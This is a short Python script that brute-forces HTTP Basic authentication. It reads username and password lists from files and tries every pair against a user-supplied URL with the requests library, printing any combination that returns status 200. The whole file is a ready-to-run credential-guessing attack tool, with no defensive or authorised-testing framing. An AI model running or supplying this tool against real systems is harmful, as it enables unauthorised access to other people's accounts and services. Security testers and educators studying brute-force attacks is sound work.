import requests


def readfile(file):
	with open(file) as f:
	    content = f.readlines()
	# remove whitespace characters like `\n` at the end of each line
	content = [x.strip() for x in content]
	return content

def bruteforce(usernames, passwords, url):
	for username in usernames:
	    for password in passwords:
	        try:
	            userpass = (username, password)
	            req = requests.get(url, auth=userpass)
	            if req.status_code == 200:
	                print ("username is : ", userpass[0])
	                print ("password is : ", userpass[1])
	                print ("Status Code: ", req.status_code)
	            else:
	                print (userpass, " didn't match!")
	                print ("Status Code: ", req.status_code)
	        except:
	            print ("Something is wrong! - Probably Connection Issues!")
def main():
	url = input("Enter URL: ")
	print("Getting user and pass from files...")
	passwords = readfile('passwords.txt')
	usernames = readfile('usernames.txt')
	print("Making Request to URL...")
	bruteforce(usernames, passwords, url)


if __name__ == '__main__':
	main()
